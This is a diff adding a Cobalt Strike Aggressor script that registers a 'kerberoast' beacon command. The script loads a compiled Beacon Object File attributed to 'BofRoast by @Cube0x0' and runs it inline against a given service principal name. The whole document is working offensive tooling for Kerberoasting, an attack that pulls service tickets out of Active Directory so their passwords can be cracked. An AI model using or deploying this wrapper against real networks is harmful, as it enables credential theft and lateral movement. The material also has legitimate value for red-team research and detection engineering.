@@ -1,0 +1,32 @@
+#Register command
+beacon_command_register(
+    "kerberoast",
+    "kerberoast a given ServicePrincipal",
+    "Synopsis: kerberoast <target SPN>"
+);
+
+alias kerberoast {
+    local('$barch $handle $data $args $target_spn');
+    println(@_);
+    
+    # figure out the arch of this session
+    $barch  = barch($1);
+    
+    # read BOF file
+    $handle = openf(script_resource("compiled/kerberoast $+ .$barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if(size(@_) == 2)
+    {
+        $args = bof_pack($1, "Z", $2);
+    } else {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("kerberoast"));
+        return;
+    }
+   
+    # 
+    btask($1, "Executing BofRoast by @Cube0x0");
+    beacon_inline_execute($1, $data, "go", $args);
+}
